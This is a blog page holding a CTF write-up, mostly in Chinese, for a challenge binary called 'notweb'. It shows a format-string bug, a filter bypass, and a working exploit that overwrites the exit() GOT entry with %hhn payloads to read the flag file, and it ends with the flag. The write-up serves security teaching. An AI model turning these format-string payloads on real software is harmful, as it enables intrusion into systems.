<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Zespre's Blog, Sometimes, we generate bugs">


        <title>notweb Writeup // Zespre's Blog // Sometimes, we generate bugs</title>


    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="/theme/css/pure.css">
    <link rel="stylesheet" href="/theme/css/pygments.css">

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
    <script>
        $(document).ready(function(){
            $(".content").fitVids();
        });
    </script>
</head>

<body>
<div class="pure-g-r" id="layout">
    <div class="sidebar sidebar-article pure-u">
        <header class="header-article">
            <hgroup>
                <a href="/author/zespre-schmidt.html" title="See posts by Zespre Schmidt">
                        <img class="avatar" alt="Zespre Schmidt" src="http://www.gravatar.com/avatar/93724215aa2d5a9f23d47bda8208073b">
                </a>
                <h2 class="article-info">Zespre Schmidt</h2>
                <small class="about-author">Bug generator</small>
                <h5>Published</h5>
                <p>Thu 27 November 2014</p>
                <a href="/">&larr;Home</a>
            </hgroup>
        </header>
    </div>
    <div class="pure-u">
        <div class="content">
            <section class="post">
                <header class="post-header">
                    <h1>notweb Writeup</h1>
                        <p class="post-meta">
                            // under                                 <a class="post-category" href="/tag/secprog/">secprog</a>
                                <a class="post-category" href="/tag/ctf/">ctf</a>
                                <a class="post-category" href="/tag/writeup/">writeup</a>
                        </p>
                </header>
            </section>
            <div class="section" id="finding-weak-points">
<h2>Finding Weak Points</h2>
<p>使用 gdb 進行 dynamic analysis 發現 <tt class="docutils literal">main()</tt> 會 call <tt class="docutils literal">get_request()</tt> ，下斷
點在 call <tt class="docutils literal">get_request()</tt> 的地方 step in 進去一步一步看。程式呼叫 <tt class="docutils literal">fgets()</tt>
讀取 input，並會以 <tt class="docutils literal">strtok()</tt> 根據空白來截斷字串。若整個 string 只有一個 word
的話會 call exit 程式結束，否則繼續執行下去。</p>
<div class="highlight"><pre><span class="err">08048</span><span class="nl">a51:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">ec</span>                <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="nb">eax</span>
<span class="err">08048</span><span class="nl">a54:</span>       <span class="err">83</span> <span class="err">7</span><span class="nf">d</span> <span class="nv">ec</span> <span class="mi">00</span>             <span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x0</span>
<span class="err">08048</span><span class="nl">a58:</span>       <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                   <span class="nv">jne</span>    <span class="mi">8048</span><span class="nv">a66</span> <span class="o">&lt;</span><span class="nv">get_request</span><span class="o">+</span><span class="mh">0x90</span><span class="o">&gt;</span>
<span class="err">08048</span><span class="nl">a5a:</span>       <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x0</span>
<span class="err">08048</span><span class="nl">a61:</span>       <span class="nf">e8</span> <span class="nv">ea</span> <span class="nv">fb</span> <span class="nv">ff</span> <span class="nv">ff</span>          <span class="nv">call</span>   <span class="mi">8048650</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
</pre></div>
<p><tt class="docutils literal">buf</tt> 吃進一行所有 input，並依序依照 ' ' 和 ':' 來截斷各個 token，示意圖如下：</p>
<div class="highlight"><pre>ORIGINAL INPUT:

GET /echo:%x%x%x%x%x
|   |     |
|   |     v
|   v     被存入 ``main()`` 中的 local variable，在此以 ``s`` 作為範例
v   字串長度為 5，第一個字元後被存入 global ``file``
被捨棄
</pre></div>
<p>此外在 <tt class="docutils literal">echo()</tt> 中看到又 <tt class="docutils literal">printf(buf)</tt> 這樣的 code，可利用 format string
leak 任意 memory 甚至寫值進去。</p>
<p>xxx yyy:zzz</p>
<p>yyy &lt;= 19: filename
zzz 可以 100000 長</p>
<p>0x0804b140: &lt;buf&gt;
0x080637e0: &lt;file&gt;</p>
</div>
<div class="section" id="weird-filter">
<h2>Weird Filter</h2>
<p>在 <tt class="docutils literal">get_request()</tt> 中，return 前會將 global <tt class="docutils literal">buf</tt> 前 n 個字元清空，導致在
<tt class="docutils literal">filter_format()</tt> 中的第二個 for loop 不會有效果。因為 global <tt class="docutils literal">buf</tt> 前段早已
被清為 0，一開始字串長度判定是 0，馬上離開 for loop。因此 global <tt class="docutils literal">buf</tt> 維持原
樣，'%' 不會被替換為 '_'。</p>
<p>在 <tt class="docutils literal">echo()</tt> 中，呼叫完 <tt class="docutils literal">filter_format()</tt> 後，會將 ':' 後的字串（'%' 已被替換
成 '_'）複製到 global <tt class="docutils literal">buf</tt> 的前段，導致可能覆蓋到 global <tt class="docutils literal">buf</tt> 中  ':' 後的
字串（'%' 未被替換為 '_'），因此若要利用 format string 來進行 exploit 的話，需要
額外的計算以確保目標 string 不被程式破壞。</p>
<p>根據上述所提供的範例輸入字串，在 <tt class="docutils literal">echo()</tt> 中執行 <tt class="docutils literal">printf(buf)</tt> 前 global
<tt class="docutils literal">buf</tt> 的值會是：</p>
<div class="highlight"><pre>_x_x_x_x_x\nx%x%x%x%x\n
</pre></div>
<p>印出來的的結果會是：</p>
<div class="highlight"><pre>_x_x_x_x_x
xfffe4f4cbf7f4b3d00
</pre></div>
<p>如果 ':' 後的字串長度（包含 'n'）長度剛好是 10 的話，可以蓋到 ':' 那格（':' 因
<tt class="docutils literal">strtok</tt> 而被置換為 string terminator），如此一來字串又可以重新連成一氣，':'
後面即是我們原本的 format string。</p>
<p>若長度不足 10 的話，就在 ':' 與 format string 之間補字元（內容不重要），確保可以
重新把 global <tt class="docutils literal">buf</tt> 接起來：</p>
<div class="highlight"><pre>GET /echo:aaaaaaa%p
</pre></div>
<p>長度大於 10 的字串，必須要在 input 最前面補上多出來的部分（內容不重要），才不會
蓋到後面的 format string：</p>
<div class="highlight"><pre>GGET /echo:%p%p%p%p%p
</pre></div>
</div>
<div class="section" id="objective">
<h2>Objective</h2>
<p>在 <tt class="docutils literal">echo()</tt> 中它的 return address 位於 $esp+0x1c，也就是用 <tt class="docutils literal">%7$p</tt> 可以 leak
return address（當然要補滿到 10 個字元）。我們的目標是改寫這裏的 address
（0x0804917f）成 <tt class="docutils literal">normal_file()</tt> 的 address（0x08048c8f）。除此之外 global
<tt class="docutils literal">file</tt> 的內容也要改成 &quot;flag&quot;，如此以來 <tt class="docutils literal">normal_file()</tt> 才能開啟 flag 並且讀
取內容。但事情並沒有想像中的那般單純，因為 remote 端有開啟 ASLR，因此 return
address 實際上在 stack 中的位置我們是無法得知的，就無法透過 format string 的方式
寫值。</p>
<p>Return address 無法修改，但其實還有別的方法可以控制 $eip，就是運用 GOT table。
<tt class="docutils literal">fflush()</tt> 在 GOT table 中的 offset 為 0x804b018 其內容為 <tt class="docutils literal">fflush()</tt> 實際所
在的位置（0xf7e78760）。只要將 <tt class="docutils literal">fflush()</tt> 所在位置移花接木到 <tt class="docutils literal">normal_file()</tt>
即可。但在實測後發現 <tt class="docutils literal">normal_file()</tt> 中也有 <tt class="docutils literal">fflush()</tt> ，這將導致無窮遞迴。
改用 <tt class="docutils literal">exit()</tt> 即可避免。 <tt class="docutils literal">exit()</tt> 在 GOT table 中的 offset 為 0x0804b03c。</p>
<div class="highlight"><pre><span class="nv">$ </span>readelf -r notweb

Relocation section <span class="s1">&#39;.rel.dyn&#39;</span> at offset 0x49c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
 0804affc  00000c06 R_386_GLOB_DAT    00000000   __gmon_start__
 0804b080  00001805 R_386_COPY        0804b080   stdin
 0804b0a0  00001605 R_386_COPY        0804b0a0   stdout

Relocation section <span class="s1">&#39;.rel.plt&#39;</span> at offset 0x4b4 contains 21 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
 0804b00c  00000107 R_386_JUMP_SLOT   00000000   strstr
 0804b010  00000207 R_386_JUMP_SLOT   00000000   strcmp
 0804b014  00000307 R_386_JUMP_SLOT   00000000   <span class="nb">printf</span>
<span class="nb"> </span>0804b018  00000407 R_386_JUMP_SLOT   00000000   fflush
 0804b01c  00000507 R_386_JUMP_SLOT   00000000   memcpy
 0804b020  00000607 R_386_JUMP_SLOT   00000000   bzero
 0804b024  00000707 R_386_JUMP_SLOT   00000000   fgets
 0804b028  00000807 R_386_JUMP_SLOT   00000000   fclose
 0804b02c  00000907 R_386_JUMP_SLOT   00000000   chdir
 0804b030  00000a07 R_386_JUMP_SLOT   00000000   fseek
 0804b034  00000b07 R_386_JUMP_SLOT   00000000   fread
 0804b038  00000c07 R_386_JUMP_SLOT   00000000   __gmon_start__
 0804b03c  00000d07 R_386_JUMP_SLOT   00000000   <span class="nb">exit</span>
<span class="nb"> </span>0804b040  00000e07 R_386_JUMP_SLOT   00000000   strlen
 0804b044  00000f07 R_386_JUMP_SLOT   00000000   __libc_start_main
 0804b048  00001007 R_386_JUMP_SLOT   00000000   write
 0804b04c  00001107 R_386_JUMP_SLOT   00000000   ftell
 0804b050  00001207 R_386_JUMP_SLOT   00000000   fopen
 0804b054  00001307 R_386_JUMP_SLOT   00000000   strncpy
 0804b058  00001407 R_386_JUMP_SLOT   00000000   strtok
 0804b05c  00001507 R_386_JUMP_SLOT   00000000   sprintf
</pre></div>
<p>除了控制 $eip 以外，還有 global variable <tt class="docutils literal">file</tt> 需要將其值改寫為 &quot;flag&quot;。</p>
</div>
<div class="section" id="exploitation">
<h2>Exploitation</h2>
<p>關鍵在於如何同時設計好 payload 又可以完美的不被程式的 filter 給破壞掉原本的
format string。 以下為 exploit 程式的主要片段。</p>
<div class="highlight"><pre><span class="c"># exit()&#39;s offset in GOT showed up in stack fram</span>
<span class="c"># normal_file() @ 0x08048c8f</span>
<span class="c"># total 16 bytes</span>
<span class="n">addr1</span>  <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804b03c</span><span class="p">)</span> <span class="c"># 0x8f</span>
<span class="n">addr1</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804b03d</span><span class="p">)</span> <span class="c"># 0x8c</span>
<span class="n">addr1</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804b03e</span><span class="p">)</span> <span class="c"># 0x04</span>
<span class="n">addr1</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804b03f</span><span class="p">)</span> <span class="c"># 0x08</span>

<span class="c"># file&#39;s address showed up in stack frame</span>
<span class="c"># file @ 0x080637e0</span>
<span class="c"># total 16 bytes</span>
<span class="n">addr2</span>  <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080637e0</span><span class="p">)</span> <span class="c"># &#39;f&#39;: 0x66 102</span>
<span class="n">addr2</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080637e1</span><span class="p">)</span> <span class="c"># &#39;l&#39;: 0x6c</span>
<span class="n">addr2</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080637e2</span><span class="p">)</span> <span class="c"># &#39;a&#39;: 0x61</span>
<span class="n">addr2</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080637e3</span><span class="p">)</span> <span class="c"># &#39;g&#39;: 0x67</span>

<span class="n">inject1</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%7c</span><span class="s">%15$hhn</span><span class="si">%253c</span><span class="s">%16$hhn</span><span class="si">%120c</span><span class="s">%17$hhn</span><span class="si">%4c</span><span class="s">%18$hhn&#39;</span> <span class="c"># 44 bytes</span>
<span class="n">inject2</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%78c</span><span class="s">%30$hhn</span><span class="si">%6c</span><span class="s">%31$hhn</span><span class="si">%245c</span><span class="s">%32$hhn</span><span class="si">%6c</span><span class="s">%33$hhna&#39;</span> <span class="c"># 44 bytes</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">&#39;G&#39;</span><span class="o">*</span><span class="mi">110</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="s">&#39;GET /echo:&#39;</span> <span class="o">+</span> <span class="n">addr1</span> <span class="o">+</span> <span class="n">inject1</span> <span class="o">+</span> <span class="n">addr2</span> <span class="o">+</span> <span class="n">inject2</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</pre></div>
</div>
<div class="section" id="flag">
<h2>Flag</h2>
<p>The flag is:</p>
<div class="highlight"><pre>SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}
</pre></div>
</div>

            <div class="hr"></div>
            <a href="#" class="go-top">Go Top</a>
<div class="comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = "zespre"; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div><footer class="footer">
    <p>&copy; Zespre's Blog &ndash;
        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
        for <a href="http://blog.getpelican.com/">Pelican</a>
    </p>
</footer>        </div>
    </div>
</div>
    <script>
        var $top = $('.go-top');

        // Show or hide the sticky footer button
        $(window).scroll(function() {
            if ($(this).scrollTop() > 200) {
                $top.fadeIn(200);
            } else {
                $top.fadeOut(200);
            }
        });

        // Animate the scroll to top
        $top.click(function(event) {
            event.preventDefault();
            $('html, body').animate({scrollTop: 0}, 300);
        })

        // Makes sure that the href="#" attached to the <a> elements
        // don't scroll you back up the page.
        $('body').on('click', 'a[href="#"]', function(event) {
            event.preventDefault();
        });
    </script>
    <script type="text/javascript">
        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script>
    <script type="text/javascript">
        try {
            var pageTracker = _gat._getTracker("UA-56544554-1");
            pageTracker._trackPageview();
            } catch(err) {}
    </script>
</body>
</html>